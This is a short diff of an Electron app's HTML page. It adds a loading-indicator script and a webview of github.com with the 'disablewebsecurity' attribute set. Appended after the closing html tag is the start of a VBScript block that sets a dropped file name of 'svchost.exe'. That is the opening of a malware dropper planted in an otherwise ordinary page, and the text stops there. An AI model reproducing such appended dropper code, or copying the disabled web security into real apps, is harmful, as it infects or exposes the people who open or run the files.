@@ -5,8 +5,8 @@
     <title>Hello World!</title>
   </head>
   <body>
+
     <script>
-      
       var alertOnlineStatus = function() {
         var flag = navigator.onLine ? 'online' : 'offline';
         ipcRenderer.sendSync('onlineOrOffline', flag);
@@ -48,6 +48,23 @@
       return false;
     };
     </script>
+
+    <script>
+  onload = function() {
+    var webview = document.getElementById("foo");
+    var indicator = document.querySelector(".indicator");
+
+    var loadstart = function() {
+      indicator.innerText = "loading...";
+    }
+    var loadstop = function() {
+      indicator.innerText = "";
+    }
+    webview.addEventListener("did-start-loading", loadstart);
+    webview.addEventListener("did-stop-loading", loadstop);
+  }
+</script>
+<webview id="foo" src="https://www.github.com/" disablewebsecurity></webview>
   </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
